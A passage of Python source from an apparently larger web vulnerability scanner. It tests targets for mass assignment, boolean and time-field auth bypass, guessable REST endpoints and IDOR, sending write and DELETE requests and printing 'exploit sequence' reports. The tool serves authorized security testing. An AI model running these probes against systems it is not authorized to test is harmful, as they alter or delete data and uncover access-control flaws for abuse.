                     "POST {%s: %s} changed server state - cluster: %s" % (field, val, cluster),
                     "field=%s value=%s cluster=%s" % (field, val, cluster))]
        if abs(len(rb) - len(base_b)) > 300:
            return [("Mass-assignment candidate: POST {%s: %s} diverged delta %+d bytes - cluster: %s"
                     % (field, val, len(rb) - len(base_b), cluster),
                     "field=%s value=%s" % (field, val))]
        return []

    probe_args: List[Tuple[str, str, str]] = []
    tested_fields: Set[str] = set()
    for cluster, synonyms in _LING_PRIV_CLUSTERS.items():
        hits = [f for f in all_fields if any(s in f.lower() for s in synonyms)]
        for field in list(dict.fromkeys(hits + synonyms))[:4]:
            if field not in tested_fields:
                tested_fields.add(field)
                for val in _LING_PRIV_VALUES[:3]:
                    probe_args.append((field, val, cluster))
    out += _par_scan(lambda a: _probe_priv(a), probe_args[:40])

    found_resources = {r.lower() for r, _ in _LING_REST_RE.findall(corpus)}
    for resource in found_resources:
        for sibling in _LING_SIBLING_MAP.get(resource, [])[:3]:
            if budget[0] <= 0:
                break
            for prefix in ("/api/v1/", "/api/", "/"):
                test_url = _join_url(base, prefix + sibling)
                c, _, _, _ = _get(test_url)
                if c == 200:
                    out.append((
                        "[CONFIRMED] Synthesized REST endpoint accessible: %s "
                        "(derived from /%s naming pattern) - verify authorization" % (test_url, resource),
                        "url=%s status=200 resource=%s" % (test_url, resource)
                    ))
                    break

    temporal = list(dict.fromkeys(f.lower() for f in _LING_TEMPORAL_RE.findall(corpus)))[:6]
    now_ts = int(time.time())
    for tfield in temporal:
        if budget[0] <= 0:
            break
        for ts_val in (str(now_ts + 86400 * 3650), "0", "-1", "9999999999"):
            c, _, rb, _ = _get(base, method="POST",
                               data=json.dumps({tfield: ts_val}).encode(),
                               content_type="application/json")
            if c in (200, 201) and any(
                s in rb.decode("utf-8", "ignore").lower()
                for s in ("valid", "success", "access", "granted", "token", "session")
            ):
                out.append((
                    "Temporal parameter confusion: field '%s'=%s accepted with positive response - "
                    "time-based access control may be bypassable" % (tfield, ts_val),
                    "field=%s value=%s status=%d" % (tfield, ts_val, c)
                ))
                break

    for field in list(all_fields)[:25]:
        fl = field.lower()
        negations: List[Tuple[str, str]] = []
        if fl.startswith("is_"):
            stem = fl[3:]
            negations = [("un" + stem, "true"), ("not_" + stem, "true"), (fl, "false"), (fl, "0")]
        elif fl in ("verified", "active", "enabled", "premium", "admin", "confirmed"):
            negations = [("un" + fl, "true"), ("not_" + fl, "true"), (fl, "false"), (fl, "0")]
        for neg_field, neg_val in negations[:2]:
            if budget[0] <= 0:
                break
            c, _, rb, _ = _get(base, method="POST",
                               data=json.dumps({neg_field: neg_val}).encode(),
                               content_type="application/json")
            if c in (200, 201) and any(
                s in rb.decode("utf-8", "ignore").lower()
                for s in ("success", "welcome", "dashboard", "token", "session", "granted")
            ):
                out.append((
                    "Negation parameter confusion: POST {%s: %s} got positive response - "
                    "boolean auth bypass via inverted form of '%s'" % (neg_field, neg_val, field),
                    "neg_field=%s neg_val=%s original=%s" % (neg_field, neg_val, field)
                ))
                break

    return out

def synthesize_application_model(url: str) -> ScanFindings:
    out: ScanFindings = []
    _deadline = threading.Event()
    _timer = threading.Timer(120.0, _deadline.set)
    _timer.daemon = True
    _timer.start()
    try:
        _am_summary: Dict[str, object] = {
            "corpus_size": 0, "invariant_count": 0,
            "transition_count": 0, "violation_count": 0,
            "invariants": [],
        }

        parsed_base = urllib.parse.urlparse(url)
        corpus_set: Set[str] = set()
        with _DISC_ENDPOINTS_LOCK:
            for ep in _DISCOVERED_ENDPOINTS:
                if urllib.parse.urlparse(ep).netloc == parsed_base.netloc:
                    corpus_set.add(ep)
        if not _deadline.is_set():
            try:
                crawled_urls, _ = _crawl(url, max_pages=40, max_depth=3)
                corpus_set.update(crawled_urls)
            except Exception:
                pass
        corpus_set.add(url)
        corpus = list(corpus_set)[:60]

        snapshots: Dict[str, _StateSnapshot] = {}
        snap_lock = threading.Lock()

        def _take_snap(u: str) -> None:
            if _deadline.is_set():
                return
            s = _app_model_snapshot(u)
            if s is not None:
                with snap_lock:
                    snapshots[u] = s

        with ThreadPoolExecutor(max_workers=15) as _ex1:
            for _f1 in as_completed([_ex1.submit(_take_snap, u) for u in corpus]):
                if _deadline.is_set():
                    break
                _f1.result()

        _am_summary["corpus_size"] = len(snapshots)
        if not snapshots:
            return out

        invariants: List[Tuple[str, Callable]] = []
        inv_meta: List[Dict] = []

        def _inv_status_fn(t: str, ok2: bool, ok4: bool) -> Callable:
            def _c(s: _StateSnapshot) -> bool:
                if s.url != t:
                    return True
                if ok2:
                    return 200 <= s.status < 300
                if ok4:
                    return s.status in (401, 403)
                return True
            return _c

        def _inv_list_fn(t: str, n: int) -> Callable:
            def _c(s: _StateSnapshot) -> bool:
                if s.url != t:
                    return True
                return 0 <= s.list_count <= n * 3 + 1
            return _c

        def _inv_pos_fn(t: str, fld: str) -> Callable:
            def _c(s: _StateSnapshot) -> bool:
                if s.url != t:
                    return True
                v = s.numeric_fields.get(fld)
                return v is None or v >= 0
            return _c

        _UUID_PAT = re.compile(
            r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.I
        )
        _NUM_ID_PAT = re.compile(r"^\d+$")

        def _inv_idpat_fn(t: str, fld: str, pat: re.Pattern) -> Callable:
            def _c(s: _StateSnapshot) -> bool:
                if s.url != t:
                    return True
                v = s.id_fields.get(fld)
                return v is None or bool(pat.match(str(v)))
            return _c

        def _inv_schema_fn(t: str, req: frozenset) -> Callable:
            def _c(s: _StateSnapshot) -> bool:
                if s.url != t or not req:
                    return True
                return req.issubset(s.json_keys)
            return _c

        def _inv_header_fn(t: str, required_hdrs: frozenset) -> Callable:
            def _c(s: _StateSnapshot) -> bool:
                if s.url != t or not required_hdrs:
                    return True
                return required_hdrs.issubset(s.header_sig)
            return _c

        _SEC_HDRS = frozenset({"x-frame-options", "content-security-policy"})
        for su, sn in snapshots.items():
            ok2 = 200 <= sn.status < 300
            ok4 = sn.status in (401, 403)
            if ok2 or ok4:
                nm = f"status_class({su})"
                invariants.append((nm, _inv_status_fn(su, ok2, ok4)))
                inv_meta.append({"name": nm, "status": "held"})
            if sn.has_list and sn.list_count > 0:
                nm = f"list_bound({su},{sn.list_count})"
                invariants.append((nm, _inv_list_fn(su, sn.list_count)))
                inv_meta.append({"name": nm, "status": "held"})
            for fld, fval in sn.numeric_fields.items():
                if fval >= 0 and _AM_POS_RE.search(fld):
                    nm = f"positive_field({su},{fld})"
                    invariants.append((nm, _inv_pos_fn(su, fld)))
                    inv_meta.append({"name": nm, "status": "held"})
            for fld, fval in sn.id_fields.items():
                if _AM_UUID_PAT.match(fval):
                    pat = _AM_UUID_PAT
                elif _AM_NUM_ID_PAT.match(fval):
                    pat = _AM_NUM_ID_PAT
                else:
                    continue
                nm = f"id_pattern({su},{fld})"
                invariants.append((nm, _inv_idpat_fn(su, fld, pat)))
                inv_meta.append({"name": nm, "status": "held"})
            if sn.json_keys:
                nm = f"schema_superset({su})"
                invariants.append((nm, _inv_schema_fn(su, sn.json_keys)))
                inv_meta.append({"name": nm, "status": "held"})
            sec_present = _SEC_HDRS & sn.header_sig
            if sec_present:
                nm = f"sec_headers({su})"
                invariants.append((nm, _inv_header_fn(su, sec_present)))
                inv_meta.append({"name": nm, "status": "held"})

        _am_summary["invariant_count"] = len(invariants)
        _am_summary["invariants"] = inv_meta
        _out(_paint(
            f"  [model] mined {len(invariants)} invariants from "
            f"{len(snapshots)} endpoint observations", A.C
        ))

        if _deadline.is_set() or _APP_MODEL_NO_WRITE_PROBES:
            _am_summary["transition_count"] = 0
            _am_summary["violation_count"] = 0
            out.append((
                f"[MODEL] Application model: {len(corpus)} endpoints, "
                f"{len(invariants)} invariants, 0 state transitions observed, "
                "0 invariant violations found",
                json.dumps(_am_summary, indent=2),
            ))
            return out

        _SYNTH_TOKEN = "SYNTH_PROBE_" + secrets.token_urlsafe(6)
        _PATH_INT_RE2 = re.compile(r"/(\d+)(?=/|$)")
        G: Dict[str, List[Tuple[str, str, str]]] = {}
        probe_results: List[Tuple[str, str, str]] = []
        pr_lock = threading.Lock()

        def _similar_urls(t_url: str, pool: List[str], top_n: int = 5) -> List[str]:
            try:
                parsed_t = urllib.parse.urlparse(t_url)
                t_segs = frozenset(sg for sg in parsed_t.path.split("/") if sg)
                t_segs |= frozenset(urllib.parse.parse_qs(parsed_t.query).keys())
                scored = []
                for pu in pool:
                    if pu == t_url:
                        continue
                    parsed_u = urllib.parse.urlparse(pu)
                    u_segs = frozenset(sg for sg in parsed_u.path.split("/") if sg)
                    u_segs |= frozenset(urllib.parse.parse_qs(parsed_u.query).keys())
                    union = len(t_segs | u_segs)
                    if union:
                        scored.append((len(t_segs & u_segs) / union, pu))
                scored.sort(reverse=True)
                return [pu for _, pu in scored[:top_n]]
            except Exception:
                return []

        def _run_write_probe(p_url: str, p_method: str, params: List[str]) -> None:
            if _deadline.is_set():
                return
            body_d = {p: _SYNTH_TOKEN for p in params} if params else {"data": _SYNTH_TOKEN}
            body_bytes = json.dumps(body_d).encode()
            summary = f"{p_method} {p_url} {json.dumps(body_d)[:200]}"
            c, _, b, _ = _req(
                p_url, method=p_method, data=body_bytes,
                headers={"Content-Type": "application/json"}, timeout=5.0,
            )
            if c in (400, 415):
                form_body = urllib.parse.urlencode(
                    {p: _SYNTH_TOKEN for p in params} if params else {"data": _SYNTH_TOKEN}
                ).encode()
                c, _, b, _ = _req(
                    p_url, method=p_method, data=form_body,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=5.0,
                )
                if c not in (405,):
                    summary = f"{p_method} {p_url} (form-encoded)"
            if c == 405:
                return
            body_text = (b or b"").decode("utf-8", "ignore")
            if c in (200, 201, 204):
                with pr_lock:
                    probe_results.append((p_url, p_method, summary))
                id_m = re.search(r'"(?:id|_id|ID|Id)"\s*:\s*"?([^",}\s]+)', body_text)
                if id_m:
                    cleanup_url = _join_url(p_url, "/" + id_m.group(1))
                    try:
                        _req(cleanup_url, method="DELETE", timeout=4.0)
                    except Exception:
                        pass
                else:
                    c_del, _, _, _ = _req(p_url, method="DELETE", timeout=4.0)
            seg_m = _AM_PATH_INT_RE.search(p_url)
            id_variants: List[str] = []
            if seg_m:
                n = int(seg_m.group(1))
                for delta in (n - 1, n + 1, n + 100):
                    if delta >= 0:
                        id_variants.append(_AM_PATH_INT_RE.sub(f"/{delta}", p_url, count=1))
            elif _UUID_RE.search(p_url):
                fake = secrets.token_hex(4) + "-0000-0000-0000-" + secrets.token_hex(6)
                id_variants.append(_UUID_RE.sub(fake, p_url, count=1))
            for var_url in id_variants:
                if _deadline.is_set():
                    break
                c2, _, _, _ = _req(var_url, timeout=5.0)
                if c2 in (200, 201):
                    with pr_lock:
                        probe_results.append((var_url, "GET", f"GET {var_url}"))

        probe_tasks: List[Tuple[str, str, List[str]]] = []
        for su, sn in list(snapshots.items())[:40]:
            if _deadline.is_set():
                break
            params = _extract_params(su)
            c_head, _, _, _ = _req(su, method="HEAD", timeout=4.0)
            if c_head != 405:
                probe_tasks.append((su, "POST", params))
                if _AM_PATH_INT_RE.search(su) or _UUID_RE.search(su):
                    probe_tasks.append((su, "PUT",   params))
                    probe_tasks.append((su, "PATCH", params))

        with ThreadPoolExecutor(max_workers=10) as _ex2:
            for _f2 in as_completed(
                [_ex2.submit(_run_write_probe, pt, pm, pp) for pt, pm, pp in probe_tasks]
            ):
                if _deadline.is_set():
                    break
                try:
                    _f2.result()
                except Exception:
                    pass

        post_snapshots: Dict[Tuple[str, str], _StateSnapshot] = {}
        ps_lock = threading.Lock()

        def _re_snap_one(ru: str, p_method: str, trigger: str) -> None:
            if _deadline.is_set():
                return
            rs = _app_model_snapshot(ru)
            if rs is not None:
                with ps_lock:
                    post_snapshots[(ru, trigger)] = rs
                    G.setdefault(ru, []).append((p_method, trigger, rs.body_hash))

        re_snap_tasks: List[Tuple[str, str, str]] = []
        snap_keys = list(snapshots.keys())
        for pu, pm, ps in probe_results:
            related = [pu] + _similar_urls(pu, snap_keys, top_n=4)
            for ru in related:
                re_snap_tasks.append((ru, pm, ps))

        with ThreadPoolExecutor(max_workers=16) as _ex3:
            for _f3 in as_completed(
                [_ex3.submit(_re_snap_one, ru, pm, ps)
                 for ru, pm, ps in re_snap_tasks]
            ):
                if _deadline.is_set():
                    break
                try:
                    _f3.result()
                except Exception:
                    pass

        _am_summary["transition_count"] = sum(len(v) for v in G.values())

        violations: List[_InvariantViolation] = []
        for (post_url, trigger), post_sn in post_snapshots.items():
            if _deadline.is_set():
                break
            baseline_sn = snapshots.get(post_url)
            if baseline_sn is None:
                continue
            for inv_name, inv_fn in invariants:
                try:
                    if inv_fn(baseline_sn) and not inv_fn(post_sn):
                        violations.append(_InvariantViolation(
                            invariant_name=inv_name,
                            violated_url=post_url,
                            trigger_request=trigger,
                            pre_snapshot=baseline_sn,
                            post_snapshot=post_sn,
                            delta_description=_am_delta(
                                baseline_sn, post_sn, inv_name, trigger
                            ),
                        ))
                except Exception:
                    pass

        _am_summary["violation_count"] = len(violations)

        seen_keys: Set[Tuple[str, str]] = set()
        for viol in violations:
            if len(out) >= 15 or _deadline.is_set():
                break
            vkey = (viol.invariant_name, viol.violated_url)
            if vkey in seen_keys:
                continue
            seen_keys.add(vkey)
            for entry in inv_meta:
                if entry["name"] == viol.invariant_name:
                    entry["status"] = "violated"
            trigger_chain: List[str] = []
            g_entries = G.get(viol.violated_url, [])
            for gm, gt, _ in g_entries:
                if gt == viol.trigger_request:
                    trigger_chain.append(f"  [trigger] {gm} {gt}")
            if not trigger_chain:
                trigger_chain = [f"  Step 2: {viol.trigger_request}"]
            step_n = 2
            steps_text = ""
            for tc in trigger_chain:
                steps_text += f"  Step {step_n}: {tc.lstrip()}\n"
                step_n += 1
            seq = (
                f"EXPLOIT SEQUENCE for invariant '{viol.invariant_name}'"
                f" on {viol.violated_url}:\n"
                f"  Step 1: GET {viol.violated_url}\n"
                f"          Expected: {viol.pre_snapshot.status} (baseline)\n"
                + steps_text +
                f"  Step {step_n}: GET {viol.violated_url}\n"
                f"          Expected: invariant no longer holds\n"
                f"  Violation: After trigger, {viol.delta_description}\n"
                f"  Impact: {_am_impact(viol)}\n"
            )
            out.append((
                f"[SYNTHESIZED] {viol.invariant_name} violated at "
                f"{viol.violated_url}: {viol.delta_description}",
                seq,
            ))

        for viol in violations:
            impact = _am_impact(viol)
            if "Broken Access Control" in impact or "Mass Assignment" in impact:
                _record_finding(
                    "app model synthesis",
                    viol.delta_description,
                    viol.trigger_request[:200],
                    "HIGH",
                )

        model_json = json.dumps(_am_summary, indent=2)
        out.append((
            f"[MODEL] Application model: {len(corpus)} endpoints, "
            f"{len(invariants)} invariants, "
            f"{_am_summary['transition_count']} state transitions observed, "
            f"{len(violations)} invariant violations found",
            model_json,
        ))
        with _EVIDENCE_LOCK:
            _EVIDENCE_TABLE["app_model"] = _am_summary

    except Exception as exc:
        out.append((
            f"[MODEL] Application model synthesis partial failure: {exc}",
            json.dumps({"error": str(exc)}, indent=2),
        ))
    finally:
        _timer.cancel()

    return out

def _print_scan_plan(base: str, args: object, planned: Optional[List[Tuple[str, Callable[[], ScanFindings]]]] = None) -> None:
    selected_categories = set(getattr(args, "scan_category", None) or [])
    planned_labels = [label for label, _ in planned] if planned is not None else []
    risk_info = _scan_risk_profile(labels=planned_labels, all_modules=bool(getattr(args, "all", False) or planned is None))
    _out(_paint("  [plan] target: " + base, A.BD + A.C))
    _out(_paint("  [plan] profile=%s workers=%s timeout=%.1fs module_timeout=%.1fs" % (
        getattr(args, "profile", "normal"),
        _GLOBAL_SCAN_WORKERS or "auto",
        _GLOBAL_TIMEOUT,
        _MODULE_TIMEOUT,
    ), A.C))
    _out(_paint("  [plan] risk=%s tags=%s" % (
        risk_info.get("risk", "normal"),
        ", ".join("%s:%s" % (k, v) for k, v in sorted((risk_info.get("tag_counts") or {}).items())) or "none",
    ), A.C))
    if selected_categories:
        _out(_paint("  [plan] categories: " + ", ".join(sorted(selected_categories)), A.C))
    if getattr(args, "all", False) or planned is None:
        _out(_paint("  [plan] modules: all registered scans plus profile extras", A.C))
    else:
        labels = planned_labels
        _out(_paint("  [plan] modules: %d" % len(labels), A.C))
        preview = ", ".join(labels[:24])
        if len(labels) > 24:
            preview += ", ..."
        if preview:
            _out(_paint("  [plan] " + preview, A.D))
    if _GLOBAL_PROXIES:
        _out(_paint("  [plan] proxies=%d strategy=%s fallback=%s" % (
            len(_GLOBAL_PROXIES), _PROXY_STRATEGY, "off" if not _PROXY_DIRECT_FALLBACK else "on"
        ), A.C))
    if _NETWORK_FAIL_FAST_THRESHOLD > 0:
        _out(_paint("  [plan] network fail-fast after %d failures" % _NETWORK_FAIL_FAST_THRESHOLD, A.C))

def _should_run_oracle_for_plan(args: object, planned: List[Tuple[str, Callable[[], ScanFindings]]]) -> bool:
    if _NO_ORACLE:
        return False
    if _LEARN_ONLY or _ORACLE_IMPORT_FILE or _ORACLE_EXPORT_FILE:
        return True
    if getattr(args, "all", False):
        return True
    if getattr(args, "no_oracle", False):
        return False
    if len(planned) <= 3 and (
        _ONLY_MODULE_FILTER
        or _STOP_AFTER_MODULES
        or any(bool(getattr(args, attr, False)) for attr, _, _ in _SCAN_REGISTRY)
    ):
        if not _QUIET_MODE:
            _out(_paint("  [oracle] skipped for tiny targeted scan; use --learn-only/--import-baseline or omit --only for oracle calibration", A.D))
        return False
    return len(planned) > 3

